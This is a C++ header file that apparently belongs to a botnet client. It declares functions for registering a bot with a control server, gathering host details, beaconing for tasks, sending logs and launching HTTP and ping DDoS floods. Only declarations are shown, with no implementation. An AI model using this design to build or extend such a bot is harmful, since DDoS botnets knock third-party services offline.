#ifndef linux_functions_h
#define linux_functions_h

#include <string>
#include "worker.h"
#include <netdb.h>
#include "worker.h"
#include <vector>
#include "task.h"

Worker registerWorker(const char* serverIP, int serverPort, in_addr ipAddress, std::string cpu, std::string ramInfo);
in_addr getIpAddress();
std::string getCPUModelName();
std::string getRAMInfo();
Command beacon(const char* serverIP, int serverPort, Worker worker, Task task);
Task request(const char* serverIP, int serverPort, Worker worker);
std::string makeHttpRequest(const char* serverIP, int serverPort, std::string httpRequest);
std::string extractJSON(std::string json);
bool doTask(const char* serverIP, int serverPort, Task task);
bool doDDOS(Task task);
void makeHttpDDOSRequest(std::string address, bool log);
unsigned short checksum(unsigned short* buf, int len);
void sendPing(const char* address);
void sendLogs(const char* serverIP, int serverPort, std::vector<std::string> logs, int bot_id);

#endif
